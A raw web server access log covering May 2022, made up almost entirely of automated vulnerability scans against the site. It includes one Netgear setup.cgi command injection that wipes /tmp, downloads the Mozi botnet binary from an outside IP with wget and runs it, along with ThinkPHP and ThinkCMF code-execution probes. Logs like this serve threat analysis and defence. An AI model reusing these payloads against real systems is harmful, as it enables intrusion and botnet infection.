[19/May/2022 15:15:10] "GET /admin/login/?next=http%3A%2F%2F14.225.16.78%2Fpublic%2Findex.html%23%2F HTTP/1.0" 200 1897
[19/May/2022 15:15:10] "GET /public/admin/css/base.css HTTP/1.0" 200 16378
Not Found: /manager/html
[19/May/2022 15:49:34] "GET /manager/html HTTP/1.0" 404 2184
Not Found: /.env
[19/May/2022 15:51:28] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[19/May/2022 15:51:29] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /storage/.env
[19/May/2022 15:51:29] "GET /storage/.env HTTP/1.0" 404 2184
[19/May/2022 15:51:30] "GET /public/.env HTTP/1.0" 404 1634
[19/May/2022 15:51:30] "POST / HTTP/1.0" 302 0
[19/May/2022 15:59:31] "GET / HTTP/1.0" 302 0
[19/May/2022 15:59:31] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[19/May/2022 16:20:27] "GET /.env HTTP/1.0" 404 2160
[19/May/2022 16:42:43] "GET / HTTP/1.0" 302 0
[19/May/2022 16:42:43] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 16:49:57] "GET / HTTP/1.0" 302 0
Not Found: /setup.cgi
[19/May/2022 17:32:12] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://153.36.9.27:39218/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2346
Not Found: /invoker/readonly
[19/May/2022 17:39:27] "GET /invoker/readonly HTTP/1.0" 404 2196
Not Found: /_ignition/execute-solution
[19/May/2022 17:39:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[19/May/2022 17:39:28] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
[19/May/2022 17:39:29] "GET / HTTP/1.0" 302 0
[19/May/2022 17:39:30] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /script
[19/May/2022 17:39:31] "GET /script HTTP/1.0" 404 2166
Not Found: /login
[19/May/2022 17:39:32] "GET /login HTTP/1.0" 404 2163
Not Found: /jenkins/login
[19/May/2022 17:39:33] "GET /jenkins/login HTTP/1.0" 404 2187
Not Found: /manager/html
[19/May/2022 17:39:34] "GET /manager/html HTTP/1.0" 404 2184
Not Found: /wp-login.php
[19/May/2022 17:39:35] "GET /wp-login.php HTTP/1.0" 404 2184
[19/May/2022 17:39:37] "GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=z7behk7y HTTP/1.0" 302 0
[19/May/2022 17:39:38] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /users/sign_in
[19/May/2022 17:39:39] "GET /users/sign_in HTTP/1.0" 404 2187
Not Found: /actuator/env
[19/May/2022 17:39:40] "GET /actuator/env HTTP/1.0" 404 2184
[19/May/2022 17:42:15] "GET / HTTP/1.0" 302 0
[19/May/2022 17:43:24] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[19/May/2022 17:43:26] "POST /HNAP1/ HTTP/1.0" 404 2167
[19/May/2022 19:12:48] "GET / HTTP/1.0" 302 0
Not Found: /.env
[19/May/2022 19:44:27] "GET /.env HTTP/1.0" 404 2160
[19/May/2022 19:44:29] "POST / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[19/May/2022 19:44:46] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
[19/May/2022 20:05:51] "GET / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[19/May/2022 20:06:46] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[19/May/2022 20:13:08] "GET / HTTP/1.0" 302 0
[19/May/2022 20:13:09] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /favicon.ico
[19/May/2022 20:13:12] "GET /favicon.ico HTTP/1.0" 404 2181
Not Found: /solr/admin/info/system
[19/May/2022 20:31:13] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
[19/May/2022 20:32:57] "GET / HTTP/1.0" 302 0
[19/May/2022 20:32:58] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:27] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 21:11:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /index.php
[19/May/2022 21:25:49] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[19/May/2022 21:38:56] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[19/May/2022 21:39:02] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: ///.env
[19/May/2022 21:55:37] "GET ///.env HTTP/1.0" 404 2166
[19/May/2022 22:24:33] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[19/May/2022 22:24:36] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 22:28:26] "GET / HTTP/1.0" 302 0
[19/May/2022 23:00:40] "GET / HTTP/1.0" 302 0
[19/May/2022 23:00:40] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /console/
[19/May/2022 23:10:40] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[19/May/2022 23:18:20] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /_ignition/execute-solution
[20/May/2022 00:20:42] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[20/May/2022 00:44:16] "GET / HTTP/1.0" 302 0
[20/May/2022 00:44:18] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 00:49:26] "GET / HTTP/1.0" 302 0
Not Found: /.env
[20/May/2022 01:03:18] "GET /.env HTTP/1.0" 404 2160
[20/May/2022 01:03:20] "POST / HTTP/1.0" 302 0
[20/May/2022 01:11:32] "GET / HTTP/1.0" 302 0
[20/May/2022 01:30:59] "GET / HTTP/1.0" 302 0
[20/May/2022 01:33:47] "GET / HTTP/1.0" 302 0
[20/May/2022 01:35:36] "GET / HTTP/1.0" 302 0
[20/May/2022 01:35:36] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 01:41:57] "GET / HTTP/1.0" 302 0
[20/May/2022 01:42:00] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 02:38:57] "GET / HTTP/1.0" 302 0
[20/May/2022 02:38:58] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /actuator/gateway/routes
[20/May/2022 02:52:06] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
Not Found: /onvif/device_service
[20/May/2022 03:11:33] "POST /onvif/device_service HTTP/1.0" 404 2209
Not Found: /onvif/device_service
[20/May/2022 03:11:43] "POST /onvif/device_service HTTP/1.0" 404 2209
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 04:09:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[20/May/2022 04:33:42] "GET / HTTP/1.0" 302 0
Not Found: /GponForm/diag_Form
[20/May/2022 04:38:48] "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 2208
[20/May/2022 04:43:03] "GET / HTTP/1.0" 302 0
[20/May/2022 04:43:04] "GET / HTTP/1.0" 302 0
[20/May/2022 04:43:05] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /phpMyAdmin-5.2.0/index.php
[20/May/2022 05:55:32] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.0" 404 2234
[20/May/2022 07:44:39] "GET / HTTP/1.0" 302 0
Not Found: /.git/config
[20/May/2022 07:48:13] "GET /.git/config HTTP/1.0" 404 2181
[20/May/2022 07:54:24] "GET / HTTP/1.0" 302 0
[20/May/2022 08:34:17] "GET / HTTP/1.0" 302 0
Not Found: /favicon.ico
[20/May/2022 08:35:05] "GET /favicon.ico HTTP/1.0" 404 2181
[20/May/2022 08:38:44] "GET / HTTP/1.0" 302 0
[20/May/2022 08:38:44] "GET / HTTP/1.0" 302 0
[20/May/2022 08:38:45] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 09:13:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[20/May/2022 09:56:26] "GET / HTTP/1.0" 302 0
[20/May/2022 10:04:05] "GET / HTTP/1.0" 302 0
[20/May/2022 10:41:21] "GET / HTTP/1.0" 302 0
[20/May/2022 10:55:18] "GET / HTTP/1.0" 302 0
[20/May/2022 10:55:18] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 10:59:23] "GET / HTTP/1.0" 302 0
[20/May/2022 11:58:53] "GET / HTTP/1.0" 302 0
[20/May/2022 12:03:58] "GET / HTTP/1.0" 302 0
[20/May/2022 12:22:42] "GET / HTTP/1.0" 302 0
[20/May/2022 12:22:43] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 12:29:17] "GET / HTTP/1.0" 302 0
[20/May/2022 14:12:40] "GET / HTTP/1.0" 302 0
[20/May/2022 14:12:40] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 14:23:01] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[20/May/2022 14:23:02] "POST /HNAP1/ HTTP/1.0" 404 2167
[20/May/2022 14:57:11] "GET / HTTP/1.0" 302 0
[20/May/2022 14:57:11] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /Public/home/js/check.js
[20/May/2022 14:57:12] "GET /Public/home/js/check.js HTTP/1.0" 404 2217
Not Found: /.env
[20/May/2022 15:28:40] "GET /.env HTTP/1.0" 404 2160
[20/May/2022 15:28:41] "POST / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:27] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 15:53:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[20/May/2022 16:36:02] "GET / HTTP/1.0" 302 0
[20/May/2022 16:36:02] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 17:33:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[20/May/2022 17:34:30] "GET / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[20/May/2022 18:00:50] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
[20/May/2022 18:10:09] "HEAD / HTTP/1.0" 302 0
[20/May/2022 18:10:09] "HEAD /public/index.html HTTP/1.0" 200 2139
[20/May/2022 18:10:09] "GET / HTTP/1.0" 302 0
[20/May/2022 18:10:09] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[20/May/2022 18:22:57] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[20/May/2022 18:31:22] "GET / HTTP/1.0" 302 0
[20/May/2022 18:33:37] "GET / HTTP/1.0" 302 0
[20/May/2022 18:33:37] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /mgmt/tm/util/bash
[20/May/2022 18:39:07] "POST /mgmt/tm/util/bash HTTP/1.0" 404 2200
[20/May/2022 18:39:08] "GET / HTTP/1.0" 302 0
Not Found: /invoker/readonly
[20/May/2022 19:02:57] "GET /invoker/readonly HTTP/1.0" 404 2196
Not Found: /_ignition/execute-solution
[20/May/2022 19:02:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[20/May/2022 19:02:58] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
[20/May/2022 19:02:59] "GET / HTTP/1.0" 302 0
[20/May/2022 19:02:59] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /script
[20/May/2022 19:02:59] "GET /script HTTP/1.0" 404 2166
Not Found: /login
[20/May/2022 19:03:00] "GET /login HTTP/1.0" 404 2163
Not Found: /jenkins/login
[20/May/2022 19:03:00] "GET /jenkins/login HTTP/1.0" 404 2187
Not Found: /manager/html
[20/May/2022 19:03:00] "GET /manager/html HTTP/1.0" 404 2184
Not Found: /wp-login.php
[20/May/2022 19:03:01] "GET /wp-login.php HTTP/1.0" 404 2184
[20/May/2022 19:03:01] "GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=woyd4rau HTTP/1.0" 302 0
[20/May/2022 19:03:02] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /users/sign_in
[20/May/2022 19:03:02] "GET /users/sign_in HTTP/1.0" 404 2187
Not Found: /actuator/env
[20/May/2022 19:03:02] "GET /actuator/env HTTP/1.0" 404 2184
Not Found: /solr/admin/info/system
[20/May/2022 19:06:38] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
[20/May/2022 19:29:31] "GET / HTTP/1.0" 302 0
[20/May/2022 19:29:31] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 19:29:32] "GET /public/favicon.ico HTTP/1.0" 200 22382
[20/May/2022 19:56:04] "GET / HTTP/1.0" 302 0
[20/May/2022 19:56:04] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /index.php
[20/May/2022 19:58:37] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
Not Found: /Autodiscover/Autodiscover.xml
[20/May/2022 20:40:21] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /mysql-admin/index.php
[20/May/2022 21:15:10] "GET /mysql-admin/index.php?lang=en HTTP/1.0" 404 2219
Not Found: /phpMyAdmin2/index.php
[20/May/2022 21:15:10] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.0" 404 2219
[20/May/2022 21:21:09] "GET / HTTP/1.0" 302 0
[20/May/2022 21:21:09] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 21:41:47] "GET / HTTP/1.0" 302 0
[20/May/2022 21:41:48] "GET / HTTP/1.0" 302 0
[20/May/2022 21:41:48] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[20/May/2022 22:41:21] "GET /.env HTTP/1.0" 404 2160
[20/May/2022 23:23:01] "GET / HTTP/1.0" 302 0
[20/May/2022 23:23:01] "GET /public/index.html HTTP/1.0" 200 2139
[20/May/2022 23:28:32] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[20/May/2022 23:45:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[20/May/2022 23:55:57] "GET / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[21/May/2022 00:17:12] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[21/May/2022 00:58:29] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /boaform/admin/formLogin
[21/May/2022 01:04:18] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 2250
Not Found: /solr/admin/info/system
[21/May/2022 01:19:45] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
[21/May/2022 01:38:34] "GET / HTTP/1.0" 302 0
[21/May/2022 01:38:34] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 01:54:58] "GET / HTTP/1.0" 302 0
[21/May/2022 01:54:59] "GET / HTTP/1.0" 302 0
[21/May/2022 01:55:00] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /index.php
[21/May/2022 02:05:58] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[21/May/2022 02:28:43] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[21/May/2022 02:28:45] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 02:35:02] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[21/May/2022 02:35:08] "POST /HNAP1/ HTTP/1.0" 404 2167
[21/May/2022 02:51:48] "GET / HTTP/1.0" 302 0
Not Found: /config/getuser
[21/May/2022 03:07:16] "GET /config/getuser?index=0 HTTP/1.0" 404 2198
[21/May/2022 03:11:45] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[21/May/2022 03:11:47] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /console/
[21/May/2022 04:10:50] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[21/May/2022 04:23:27] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /phpMyAdmin-5/index.php
[21/May/2022 04:39:31] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 2222
Not Found: /_ignition/execute-solution
[21/May/2022 05:10:25] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[21/May/2022 05:20:38] "GET / HTTP/1.0" 302 0
[21/May/2022 05:20:38] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 05:28:41] "GET / HTTP/1.0" 302 0
[21/May/2022 05:29:21] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 05:29:30] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /robots.txt
